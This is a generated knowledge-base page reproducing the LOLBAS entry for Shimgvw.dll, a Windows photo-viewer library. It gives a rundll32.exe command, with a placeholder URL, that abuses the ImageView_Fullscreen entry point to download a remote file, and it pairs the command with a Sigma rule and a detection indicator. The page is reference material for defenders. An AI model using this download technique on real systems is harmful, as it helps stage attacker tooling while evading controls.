---
title: "Shimgvw.dll"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/Shimgvw.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shimgvw.yml"
build_date: "2026-04-27 18:39:01"
category: "OSLibraries"
aliases:
  - "Shimgvw.dll"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Shimgvw.dll

Photo Gallery Viewer

## Metadata

- Category: OSLibraries
- Created: 2021-01-06
- Author: Eral4m
- Source Path: yml/OSLibraries/Shimgvw.yml

## Paths

- `c:\windows\system32\shimgvw.dll`
- `c:\windows\syswow64\shimgvw.dll`

## Commands

### 1. Download

Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.

```cmd
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

- Use Case: Download file from remote location.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line

## Resources

- {'Link': 'https://twitter.com/eral4m/status/1479080793003671557'}

## Acknowledgements

- {'Person': 'Eral4m', 'Handle': '@eral4m'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shimgvw.yml)
